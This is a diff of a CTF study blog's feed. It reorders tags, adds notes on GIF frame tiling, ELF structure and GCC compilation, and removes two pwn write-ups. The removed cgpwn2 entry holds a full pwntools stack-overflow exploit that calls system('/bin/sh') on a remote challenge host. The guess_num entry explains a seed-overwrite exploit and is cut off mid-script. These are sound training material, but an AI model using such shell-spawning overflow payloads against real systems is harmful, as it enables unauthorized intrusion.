@@ -33,9 +33,9 @@
     <category term="便捷算法" scheme="https://4ss1du0us.github.io/categories/%E4%BE%BF%E6%8D%B7%E7%AE%97%E6%B3%95/"/>
     
     
-    <category term="CTF笔记" scheme="https://4ss1du0us.github.io/tags/CTF%E7%AC%94%E8%AE%B0/"/>
-    
     <category term="CTF刷题" scheme="https://4ss1du0us.github.io/tags/CTF%E5%88%B7%E9%A2%98/"/>
+    
+    <category term="CTF笔记" scheme="https://4ss1du0us.github.io/tags/CTF%E7%AC%94%E8%AE%B0/"/>
     
     <category term="REVERSE" scheme="https://4ss1du0us.github.io/tags/REVERSE/"/>
     
@@ -58,9 +58,9 @@
     <category term="杂项" scheme="https://4ss1du0us.github.io/categories/%E6%9D%82%E9%A1%B9/"/>
     
     
-    <category term="CTF笔记" scheme="https://4ss1du0us.github.io/tags/CTF%E7%AC%94%E8%AE%B0/"/>
-    
     <category term="MISC" scheme="https://4ss1du0us.github.io/tags/MISC/"/>
+    
+    <category term="CTF笔记" scheme="https://4ss1du0us.github.io/tags/CTF%E7%AC%94%E8%AE%B0/"/>
     
   </entry>
   
@@ -81,9 +81,9 @@
     <category term="杂项" scheme="https://4ss1du0us.github.io/categories/%E6%9D%82%E9%A1%B9/"/>
     
     
-    <category term="CTF笔记" scheme="https://4ss1du0us.github.io/tags/CTF%E7%AC%94%E8%AE%B0/"/>
-    
     <category term="MISC" scheme="https://4ss1du0us.github.io/tags/MISC/"/>
+    
+    <category term="CTF笔记" scheme="https://4ss1du0us.github.io/tags/CTF%E7%AC%94%E8%AE%B0/"/>
     
   </entry>
   
@@ -104,9 +104,9 @@
     <category term="杂项" scheme="https://4ss1du0us.github.io/categories/%E6%9D%82%E9%A1%B9/"/>
     
     
-    <category term="CTF笔记" scheme="https://4ss1du0us.github.io/tags/CTF%E7%AC%94%E8%AE%B0/"/>
-    
     <category term="MISC" scheme="https://4ss1du0us.github.io/tags/MISC/"/>
+    
+    <category term="CTF笔记" scheme="https://4ss1du0us.github.io/tags/CTF%E7%AC%94%E8%AE%B0/"/>
     
   </entry>
   
@@ -127,9 +127,9 @@
     <category term="杂项" scheme="https://4ss1du0us.github.io/categories/%E6%9D%82%E9%A1%B9/"/>
     
     
-    <category term="CTF笔记" scheme="https://4ss1du0us.github.io/tags/CTF%E7%AC%94%E8%AE%B0/"/>
-    
     <category term="MISC" scheme="https://4ss1du0us.github.io/tags/MISC/"/>
+    
+    <category term="CTF笔记" scheme="https://4ss1du0us.github.io/tags/CTF%E7%AC%94%E8%AE%B0/"/>
     
   </entry>
   
@@ -138,24 +138,21 @@
     <link href="https://4ss1du0us.github.io/2023/03/19/CTF%20-%20Misc/GIF%E5%9B%BE%E7%89%87%E6%8B%86%E5%88%86&amp;%E6%8B%BC%E5%9B%BE/"/>
     <id>https://4ss1du0us.github.io/2023/03/19/CTF%20-%20Misc/GIF%E5%9B%BE%E7%89%87%E6%8B%86%E5%88%86&amp;%E6%8B%BC%E5%9B%BE/</id>
     <published>2023-03-19T07:56:04.000Z</published>
-    <updated>2023-03-28T11:53:10.494Z</updated>
+    <updated>2023-03-29T04:27:24.679Z</updated>
     
     <content type="html"><![CDATA[<h2 id="Windows-平台"><a href="#Windows-平台" class="headerlink" title="Windows 平台"></a>Windows 平台</h2><h3 id="拆分并拼图"><a href="#拆分并拼图" class="headerlink" title="拆分并拼图"></a>拆分并拼图</h3><blockquote><p>将 GIF 拆分成一帧一帧的片段，并直接将这些片段拼起来在网站上展示一整张图</p></blockquote><ul><li>在线网站：<a href="https://tu.sioe.cn/gj/fenjie/">GIF动态图片分解，多帧动态图分解成多张静态图片</a></li></ul><hr><h3 id="拆分"><a href="#拆分" class="headerlink" title="拆分"></a>拆分</h3><blockquote><p>将 GIF 拆分成一帧一帧的单独文件，可打包下载到本地，但没有拼图的功能</p></blockquote><ul><li>在线网站：<a href="https://uutool.cn/gif2img/">在线GIF图片帧拆分工具 - UU在线工具</a></li></ul><hr><h3 id="ImageMagick"><a href="#ImageMagick" class="headerlink" title="ImageMagick"></a>ImageMagick</h3><blockquote><p>配合 <a href="https://uutool.cn/gif2img/">在线GIF图片帧拆分工具 - UU在线工具</a> 使用，先将 GIF 拆分成一个个文件，并置于同一文件夹内，然后使用 ImageMagick 进行拼接</p></blockquote><ul><li>下载：<a href="https://imagemagick.org/script/download.php#windows">图像魔术 – 下载</a></li><li>使用：<ol><li>到需要拼接的图片目录下，调用 <code>cmd</code></li><li>执行命令：<br> <code>magick montage *.png -tile &lt;1x10&gt; -geometry +0+0 flag.png</code> </li><li><strong>注意</strong>：只需修改 <code>&lt;1x10&gt;</code> 的位置 【1x10 表示将该文件夹下的图片拼成一行、每行十张，拼接得到一张大图】</li><li>这里的 <code>-geometry +0+0</code> 表示各个图片之间不需要间隔</li></ol></li></ul><hr><h2 id="Linux-平台"><a href="#Linux-平台" class="headerlink" title="Linux 平台"></a>Linux 平台</h2><h3 id="convert"><a href="#convert" class="headerlink" title="convert"></a>convert</h3><blockquote><p>在 Linux 下，convert 是一款基于 ImageMagick 软件的命令行工具，用于进行图像格式转换、大小调整、旋转、剪切、添加边框、改变图像色彩等操作</p></blockquote><ul><li>使用：<br>  <code>convert &lt;.gif 文件名&gt; &lt;输出路径/flag.png&gt;</code></li></ul><hr><h3 id="montage"><a href="#montage" class="headerlink" title="montage"></a>montage</h3><blockquote><p>在 Linux 下，montage 是基于 ImageMagick 工具集的一个命令行工具，用于将多张图片合成为一张大图</p></blockquote><ul><li>下载安装：<br>  <code>sudo apt-get install graphicsmagick-imagemagick-compat</code></li><li>使用：<ol><li>到需要拼接的图片目录下，打开终端</li><li>执行命令：<br> <code>montage *.png -tile &lt;1x10&gt; -geometry +0+0 flag.png</code></li><li><strong>注意</strong>：只需修改 <code>&lt;1x10&gt;</code> 的位置 【1x10 表示将该文件夹下的图片拼成一行、每行十张，拼接得到一张大图】</li><li>这里的 <code>-geometry +0+0</code> 表示各个图片之间不需要间隔</li></ol></li></ul><hr>]]></content>
     
     
-      
-      
-    <summary type="html">&lt;h2 id=&quot;Windows-平台&quot;&gt;&lt;a href=&quot;#Windows-平台&quot; class=&quot;headerlink&quot; title=&quot;Windows 平台&quot;&gt;&lt;/a&gt;Windows 平台&lt;/h2&gt;&lt;h3 id=&quot;拆分并拼图&quot;&gt;&lt;a href=&quot;#拆分并拼图&quot; class=&quot;he</summary>
-      
+    <summary type="html">做杂项时遇到的一中类型：将GIF拆分成帧，再将帧拼接成一张完整的图</summary>
     
     
     
     <category term="杂项" scheme="https://4ss1du0us.github.io/categories/%E6%9D%82%E9%A1%B9/"/>
     
     
-    <category term="CTF笔记" scheme="https://4ss1du0us.github.io/tags/CTF%E7%AC%94%E8%AE%B0/"/>
-    
     <category term="MISC" scheme="https://4ss1du0us.github.io/tags/MISC/"/>
+    
+    <category term="CTF笔记" scheme="https://4ss1du0us.github.io/tags/CTF%E7%AC%94%E8%AE%B0/"/>
     
   </entry>
   
@@ -268,9 +265,9 @@
     <category term="杂项" scheme="https://4ss1du0us.github.io/categories/%E6%9D%82%E9%A1%B9/"/>
     
     
-    <category term="MISC" scheme="https://4ss1du0us.github.io/tags/MISC/"/>
-    
     <category term="CTF刷题" scheme="https://4ss1du0us.github.io/tags/CTF%E5%88%B7%E9%A2%98/"/>
+    
+    <category term="MISC" scheme="https://4ss1du0us.github.io/tags/MISC/"/>
     
   </entry>
   
@@ -291,9 +288,9 @@
     <category term="杂项" scheme="https://4ss1du0us.github.io/categories/%E6%9D%82%E9%A1%B9/"/>
     
     
-    <category term="MISC" scheme="https://4ss1du0us.github.io/tags/MISC/"/>
-    
     <category term="CTF刷题" scheme="https://4ss1du0us.github.io/tags/CTF%E5%88%B7%E9%A2%98/"/>
+    
+    <category term="MISC" scheme="https://4ss1du0us.github.io/tags/MISC/"/>
     
   </entry>
   
@@ -314,9 +311,9 @@
     <category term="杂项" scheme="https://4ss1du0us.github.io/categories/%E6%9D%82%E9%A1%B9/"/>
     
     
-    <category term="MISC" scheme="https://4ss1du0us.github.io/tags/MISC/"/>
-    
     <category term="CTF刷题" scheme="https://4ss1du0us.github.io/tags/CTF%E5%88%B7%E9%A2%98/"/>
+    
+    <category term="MISC" scheme="https://4ss1du0us.github.io/tags/MISC/"/>
     
   </entry>
   
@@ -337,9 +334,9 @@
     <category term="杂项" scheme="https://4ss1du0us.github.io/categories/%E6%9D%82%E9%A1%B9/"/>
     
     
-    <category term="MISC" scheme="https://4ss1du0us.github.io/tags/MISC/"/>
-    
     <category term="CTF刷题" scheme="https://4ss1du0us.github.io/tags/CTF%E5%88%B7%E9%A2%98/"/>
+    
+    <category term="MISC" scheme="https://4ss1du0us.github.io/tags/MISC/"/>
     
   </entry>
   
@@ -360,9 +357,9 @@
     <category term="杂项" scheme="https://4ss1du0us.github.io/categories/%E6%9D%82%E9%A1%B9/"/>
     
     
-    <category term="MISC" scheme="https://4ss1du0us.github.io/tags/MISC/"/>
-    
     <category term="CTF刷题" scheme="https://4ss1du0us.github.io/tags/CTF%E5%88%B7%E9%A2%98/"/>
+    
+    <category term="MISC" scheme="https://4ss1du0us.github.io/tags/MISC/"/>
     
   </entry>
   
@@ -383,9 +380,9 @@
     <category term="杂项" scheme="https://4ss1du0us.github.io/categories/%E6%9D%82%E9%A1%B9/"/>
     
     
-    <category term="MISC" scheme="https://4ss1du0us.github.io/tags/MISC/"/>
-    
     <category term="CTF刷题" scheme="https://4ss1du0us.github.io/tags/CTF%E5%88%B7%E9%A2%98/"/>
+    
+    <category term="MISC" scheme="https://4ss1du0us.github.io/tags/MISC/"/>
     
   </entry>
   
@@ -406,9 +403,9 @@
     <category term="杂项" scheme="https://4ss1du0us.github.io/categories/%E6%9D%82%E9%A1%B9/"/>
     
     
-    <category term="MISC" scheme="https://4ss1du0us.github.io/tags/MISC/"/>
-    
     <category term="CTF刷题" scheme="https://4ss1du0us.github.io/tags/CTF%E5%88%B7%E9%A2%98/"/>
+    
+    <category term="MISC" scheme="https://4ss1du0us.github.io/tags/MISC/"/>
     
   </entry>
   
@@ -429,55 +426,55 @@
     <category term="杂项" scheme="https://4ss1du0us.github.io/categories/%E6%9D%82%E9%A1%B9/"/>
     
     
+    <category term="CTF刷题" scheme="https://4ss1du0us.github.io/tags/CTF%E5%88%B7%E9%A2%98/"/>
+    
     <category term="MISC" scheme="https://4ss1du0us.github.io/tags/MISC/"/>
     
-    <category term="CTF刷题" scheme="https://4ss1du0us.github.io/tags/CTF%E5%88%B7%E9%A2%98/"/>
+  </entry>
+  
+  <entry>
+    <title>ELF文件</title>
+    <link href="https://4ss1du0us.github.io/2023/03/19/Linux/ELF%E6%96%87%E4%BB%B6/"/>
+    <id>https://4ss1du0us.github.io/2023/03/19/Linux/ELF%E6%96%87%E4%BB%B6/</id>
+    <published>2023-03-19T07:23:24.000Z</published>
+    <updated>2023-03-29T01:59:45.168Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="ELF文件"><a href="#ELF文件" class="headerlink" title="ELF文件"></a>ELF文件</h2><ul><li>可执行、可链接格式</li></ul><hr><h2 id="ELF文件类型"><a href="#ELF文件类型" class="headerlink" title="ELF文件类型"></a>ELF文件类型</h2><h3 id="可执行文件"><a href="#可执行文件" class="headerlink" title="可执行文件"></a>可执行文件</h3><ul><li>经过链接的、可执行的文件，也叫程序</li></ul><h3 id="可重定位文件"><a href="#可重定位文件" class="headerlink" title="可重定位文件"></a>可重定位文件</h3><ul><li>由源文件编译而成尚未链接的目标文件，通常以“.o”为扩展名</li></ul><h3 id="共享目标文件"><a href="#共享目标文件" class="headerlink" title="共享目标文件"></a>共享目标文件</h3><ul><li>动态链接库文件，在链接过程中与其他动态链接库或可重定位文件一起构建新的目标文件，或在文件加载时连接到进程中作为运行代码的一部分</li></ul><blockquote><p>核心转储文件作为进程意外终止时进程地址空间的转储，也是 ELF 文件的一种</p></blockquote><hr><h2 id="ELF文件的结构"><a href="#ELF文件的结构" class="headerlink" title="ELF文件的结构"></a>ELF文件的结构</h2><ul><li>从链接视角来看，通过 <strong><em>节(Section)</em></strong> 来进行划分</li><li>从运行视角来看，通过 <strong><em>段(Segment)</em></strong> 来进行划分</li></ul><p><img src="https://s2.loli.net/2023/03/19/fXvBAaGZ2dnOmYC.png" alt="Linux基础_ELF文件1.png"></p>]]></content>
+    
+    
+    <summary type="html">学习pwn还是必须了解一些ELF文件的结构，简单总结一下</summary>
+    
+    
+    
+    <category term="Linux" scheme="https://4ss1du0us.github.io/categories/Linux/"/>
+    
+    
+    <category term="CTF笔记" scheme="https://4ss1du0us.github.io/tags/CTF%E7%AC%94%E8%AE%B0/"/>
+    
+    <category term="Linux" scheme="https://4ss1du0us.github.io/tags/Linux/"/>
     
   </entry>
   
   <entry>
-    <title>攻防世界-cgpwn2</title>
-    <link href="https://4ss1du0us.github.io/2023/03/19/CTF%20-%20Pwn_Writeup/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-cgpwn2/"/>
-    <id>https://4ss1du0us.github.io/2023/03/19/CTF%20-%20Pwn_Writeup/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-cgpwn2/</id>
+    <title>GCC编译过程</title>
+    <link href="https://4ss1du0us.github.io/2023/03/19/Linux/GCC%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B/"/>
+    <id>https://4ss1du0us.github.io/2023/03/19/Linux/GCC%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B/</id>
     <published>2023-03-19T07:23:24.000Z</published>
-    <updated>2023-03-29T00:46:06.321Z</updated>
+    <updated>2023-03-29T02:04:03.588Z</updated>
     
-    <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><p><strong><em>当程序中没有后门函数时</em></strong>：<br><mark>可以通过向段中写入 <code>&quot;/bin/sh&quot;</code>，然后通过栈溢出调用 <code>system()</code> 函数将写入的 <code>&quot;/bin/sh&quot;</code> 作为参数执行</mark></p></li><li><p><mark>在调用 <code>system()</code> 函数时，<strong>若想要向其传入参数</strong>，注意填充 <strong>4个 字节</strong> 的数据来平衡栈</mark>，<strong>因为调用 <code>system()</code> 函数的时候要压入一个返回地址</strong>【<em>有时候直接写 p32(0) 也可以，这也是一个 4字节 的数据</em>】</p></li></ul><blockquote><p>为什么要填充 4个 字节？</p></blockquote><ol><li>当程序调用 <code>system()</code> 函数时，会自动去寻找栈底，即 <code>ebp</code> 指向的位置，然后将 <code>ebp+8 字节</code> 的位置的数据当作函数的参数</li><li>如果想将 <code>/bin/sh</code> 作为 <code>system()</code> 函数的参数，就可以在栈溢出的时候，先修改 <code>eip</code> 为 <code>system()</code> 函数的地址，然后填充 <code>4个字节</code> 的垃圾数据，再将 <code>/bin/sh</code> 的地址写入栈上，这样调用 <code>system()</code> 函数的时候，就可以将 <code>/bin/sh</code> 作为参数，然后返回一个 <code>shell</code></li><li>为什么是在 <code>eip</code>【即 <code>system()</code> 函数地址】后面覆盖 <code>4个字节</code> 垃圾数据而不是前面提到的 <code>8个字节</code>？<br> 这是因为当调用 <code>system()</code> 函数的时候，在 <code>system()</code> 函数中会首先执行 <code>push ebp</code> 指令，将 <code>4字节</code> 的 <code>ebp</code> 地址压入栈中，而此时的栈底距离参数 <code>/bin/sh</code> 正好 <code>8字节</code>，所以应该填充 <code>4字节</code> 垃圾数据<br><img src="https://s2.loli.net/2023/03/18/SoGkB1pXuNM9Hvh.png" alt="攻防世界-cgpwn2 0.png"></li></ol><hr><p><a href="https://adworld.xctf.org.cn/media/file/task/53c24fc5522e4a8ea2d9ad0577196b2f">攻防世界-cgpwn2</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>查看文件信息：<br><img src="https://s2.loli.net/2023/03/18/47GXA5cqQbWhKH6.png" alt="攻防世界-cgpwn2 1.png"><br>32位 小端序，只开启了栈不可执行</p></li><li><p>尝试执行：<br><img src="https://s2.loli.net/2023/03/18/85zA6Mwbg9ctLRG.png" alt="攻防世界-cgpwn2 2.png"></p></li><li><p>在 IDA 中分析：<br><img src="https://s2.loli.net/2023/03/18/k1HcRSt3fLjVKux.png" alt="攻防世界-cgpwn2 3.png"><br>跟进 <code>hello()</code>：<br><img src="https://s2.loli.net/2023/03/18/Ofux8XA2B39paIW.png" alt="攻防世界-cgpwn2 4.png"><br>有两个输入：<code>name</code> 和 <code>s</code>，查看 <code>name</code> 的写入位置：<br><img src="https://s2.loli.net/2023/03/18/Lmj7w5i6pVunSKo.png" alt="攻防世界-cgpwn2 5.png"><br>发现<mark>输入的 <code>name</code> 是存储在 <code>.bss</code> 段上的，不是在栈中</mark><br>查看 <code>s</code> 的写入位置：<br><img src="https://s2.loli.net/2023/03/18/PL1k2cOzNJFgUjS.png" alt="攻防世界-cgpwn2 6.png"><br>可以通过 <code>gets()</code> 函数溢出函数返回值，转而执行其他函数</p></li><li><p>发现后门函数：<br><img src="https://s2.loli.net/2023/03/18/83ULcImpSFXqCi9.png" alt="攻防世界-cgpwn2 7.png"><br>但是这个函数只是执行 <code>echo hehehe</code>，即：打印 <code>hehehe</code>，并不能提供 flag</p></li><li><p><mark>既然输入的 <code>name</code> 可以往 <code>.bss</code> 段上写入数据，因此可以考虑通过 <code>name</code> 往 <code>.bss</code> 段上写入 <code>&quot;/bin/sh&quot;</code>，然后再通过输入 <code>s</code> 将栈溢出，使程序调用 <code>system()</code> 函数，再将事先写入的 <code>&quot;/bin/sh&quot;</code> 做为 <code>system()</code> 函数的参数，即可 PWN 掉程序</mark></p></li><li><p>就是需要注意：调用 <code>system()</code> 函数后需要需要填充 <strong>4个字节</strong> 的垃圾数据来保持栈的平衡<br>因为调用 <code>system()</code> 函数的时候要压入一个返回地址，需要填充 <strong>4个 字节</strong>；<br>除写 <code>b&#39;a&#39; * 4</code> 之外，还可以写 <code>p32(0)</code>，也可以代表 <strong>4个 字节</strong></p></li></ol><hr><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment"># 打印调试信息</span>content <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 本地Pwn通之后，将content改成0，Pwn远程端口</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./cgpwn2"</span><span class="token punctuation">)</span>  <span class="token comment"># 生成elf对象</span>system_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>  <span class="token comment"># 获取system函数的地址</span>bin_sh_addr <span class="token operator">=</span> <span class="token number">0x0804A080</span>  <span class="token comment"># s在.bss段上写入的地址，地址可以在ida中查看到，要往这里写入“/bin/sh”，然后用system函数调用它</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./cgpwn2"</span><span class="token punctuation">)</span>  <span class="token comment"># 程序在kali的路径</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"61.147.171.105"</span><span class="token punctuation">,</span> <span class="token number">65027</span><span class="token punctuation">)</span>  <span class="token comment"># 题目的远程端口</span>    payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x26</span> <span class="token operator">-</span> <span class="token number">0x00</span> <span class="token operator">+</span> <span class="token number">0x04</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>  <span class="token comment"># 通过栈溢出调用system函数</span>    payload <span class="token operator">=</span> payload <span class="token operator">+</span> <span class="token string">b'aaaa'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span>  <span class="token comment"># 填充4个字节平衡栈，然后将写入“/bin/sh”的地址作为参数</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"please tell me your name\n"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"hello,you can leave some message here:"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>cyberpeace{d4336a51b8192c14138838a676822392}</p></blockquote><p><img src="https://s2.loli.net/2023/03/18/3VAoiOGqnNeypxU.png" alt="攻防世界-cgpwn2 8.png"></p>]]></content>
-    
-    
-    <summary type="html">当程序中没有后门函数时，可以向段中写入/bin/sh，然后跳转到system函数将/bin/sh作为参数执行</summary>
+    <content type="html"><![CDATA[<h2 id="GCC-编译主要包括四个阶段"><a href="#GCC-编译主要包括四个阶段" class="headerlink" title="GCC 编译主要包括四个阶段"></a>GCC 编译主要包括四个阶段</h2><h3 id="预处理"><a href="#预处理" class="headerlink" title="预处理"></a>预处理</h3><ul><li>主要是处理源代码中以 <code>&quot;#&quot;</code> 开头的预处理指令，比如 <code>#include</code>、<code>#define</code> 等，将其置换后直接插入程序文本中，得到另一个 C 程序，通常以 <code>.i</code> 作为扩展名<ol><li>递归处理 <code>#include</code> 预处理指令，将对应文件的内容复制到该指令的位置</li><li>删除所有的 <code>#define</code> 指令，并在其被引用的位置递归地展开所有的宏</li><li>处理所有的条件预处理指令，如：<code>#if</code>、<code>#ifdef</code>、<code>#elif</code>、<code>#else</code>、<code>#endif</code> 等</li><li>删除所有的注释</li><li>添加行号和文件名标识</li></ol></li></ul><h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><ul><li>将预处理文件进行一系列的词法分析、语法分析、语义分析以及优化，最终生成汇编代码，通常以 <code>.s</code> 作为扩展名</li><li>GCC 默认使用 <code>AT&amp;T</code> 格式的汇编语言，添加编译选项 <code>-masm = intel</code> 可以指定为 <code>intel</code> 格式</li><li>编译选项 <code>-fno-asynchronous-unwind-tables</code> 用于生成没有 cfi 宏的汇编指令，提高可读性</li><li>若 <code>printf()</code> 只有单一参数，GCC 的优化策略会将其替换成 <code>puts()</code> 以提高性能</li></ul><h3 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h3><ul><li>汇编器根据汇编指令与机器指令对照表进行翻译，通常以 <code>.o</code> 作为扩展名</li><li>此时的 <code>.o</code> 文件是一个可重定位文件，可以使用 <code>objdump -sd &lt;文件名.o&gt; -M intel</code> 查看其内容</li><li>由于此时还未进行链接，文件符号中的虚拟地址无法确定</li></ul><h3 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h3><ul><li>GCC 默认为动态链接（添加编译选项 <code>- static</code> 可指定使用静态编译）</li><li>将目标文件及其依赖库进行链接，生成可执行文件。包括：地址和空间分配、符号绑定、重定位等</li><li>链接操作由链接器（ld.so）完成，然后就会得到一个可执行文件，其包含了大量的库文件</li><li>链接完成后，上一步无法确定的虚拟地址就被修正为实际的符号地址，可以被加载到内存中正常执行</li></ul>]]></content>
     
     
-    
-    <category term="二进制漏洞利用" scheme="https://4ss1du0us.github.io/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
-    
-    
-    <category term="CTF刷题" scheme="https://4ss1du0us.github.io/tags/CTF%E5%88%B7%E9%A2%98/"/>
-    
-    <category term="PWN" scheme="https://4ss1du0us.github.io/tags/PWN/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>攻防世界-guess_num</title>
-    <link href="https://4ss1du0us.github.io/2023/03/19/CTF%20-%20Pwn_Writeup/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-guess_num/"/>
-    <id>https://4ss1du0us.github.io/2023/03/19/CTF%20-%20Pwn_Writeup/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-guess_num/</id>
-    <published>2023-03-19T07:23:24.000Z</published>
-    <updated>2023-03-29T00:48:55.037Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><p><mark>栈溢出漏洞</mark></p></li><li><p>通过 <mark>Python 实现 C 语言函数的运行</mark>，利用 <code>ctypes</code> 库和 <code>cdll.LoadLibrary(&quot;libc.so.6&quot;)</code></p></li><li><p>通过<mark>编写脚本来 PWN 通程序中函数的逻辑</mark></p></li></ul><hr><p><a href="https://adworld.xctf.org.cn/media/file/task/b59204f56a0545e8a22f8518e749f19f">攻防世界-guess_num</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>查看文件信息：<br><img src="https://s2.loli.net/2023/03/18/2CcvqlkIjt4hr5z.png" alt="攻防世界-guess_num1.png"><br>64位 小端序，金丝雀、栈不可执行、地址随机化全都开启</p></li><li><p>尝试执行：<br><img src="https://s2.loli.net/2023/03/18/3YjyBQtAL4XceOZ.png" alt="攻防世界-guess_num2.png"></p></li><li><p>打开 IDA 分析：<br><img src="https://s2.loli.net/2023/03/18/c1xPTpAjw3eWyXG.png" alt="攻防世界-guess_num3.png"><br>发现随机数种子 <code>seed</code>，且存在 <code>gets()</code> 这种明显的漏洞函数<br>函数 <code>sub_BB0()</code> 用来生成随机数种子：<br><img src="https://s2.loli.net/2023/03/18/opRS6GCUDQiTyf3.png" alt="攻防世界-guess_num4.png"><br>在 <code>puts(&quot;Success!&quot;)</code> 后执行了函数 <code>sub_C3E()</code>，跟进：<br><img src="https://s2.loli.net/2023/03/18/NzqhCAxUBao1Yw6.png" alt="攻防世界-guess_num5.png"><br>该函数会执行 <code>system(&quot;cat flag&quot;)</code>，说明只要让这个函数执行就可以得到 flag，即：保持 <code>for</code> 循环不会中途退出</p></li><li><p>分析 <code>for</code> 循环的逻辑：总共循环 10 次，并且每次循环会根据 <code>v6 = rand() % 6 + 1</code> 生成一个随机数 <code>v6</code>，然后让用户输入一个 <code>v4</code>，只有当 <code>v4 == v6</code> 才能让循环继续下去</p></li><li><p>观察栈中数据的位置：<br><img src="https://s2.loli.net/2023/03/18/xCtyGoNTp7OVUs2.png" alt="攻防世界-guess_num6.png"><br><mark>发现用户输入的 <code>v7</code> 在随机数种子 <code>seed</code> 的上方，而且用户的输入在函数 <code>sub_BB0()</code> 生成随机数种子的操作之后，因此可以通过将 <code>v7</code> 溢出从而修改随机数种子 <code>seed</code> 的值，这样就可以得到 <code>v6 = rand() % 6 + 1</code> 所产生的所有伪随机数，之后编写脚本将所有产生的 <code>v6</code> 作为输入发送过去，就可以实现猜中所有的随机数了</mark></p></li><li><p><strong>注意，在 Python 中，可以通过 <code>from ctypes import *</code> 引入 C 语言库，用 <code>lib = cdll.LoadLibrary(&quot;libc.so.6&quot;)</code>  导入 C 运行库，就可以使用 <code>lib</code> 来执行 C 语言的函数了</strong></p></li></ol><hr><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span>  <span class="token comment"># 导入ctypes库使Python可以执行C语言的函数</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment"># 打印调试信息</span>content <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 本地Pwn通之后，将content改成0，Pwn远程端口</span><span class="token keyword">global</span> io<span class="token keyword">def</span> <span class="token function">srand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> io    lib <span class="token operator">=</span> cdll<span class="token punctuation">.</span>LoadLibrary<span class="token punctuation">(</span><span class="token string">"libc.so.6"</span><span class="token punctuation">)</span>  <span class="token comment"># C运行库</span>    lib<span class="token punctuation">.</span>srand<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># 根据ida的伪代码，先将种子设为1</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        number <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>lib<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">6</span> <span class="token operator">+</span> <span 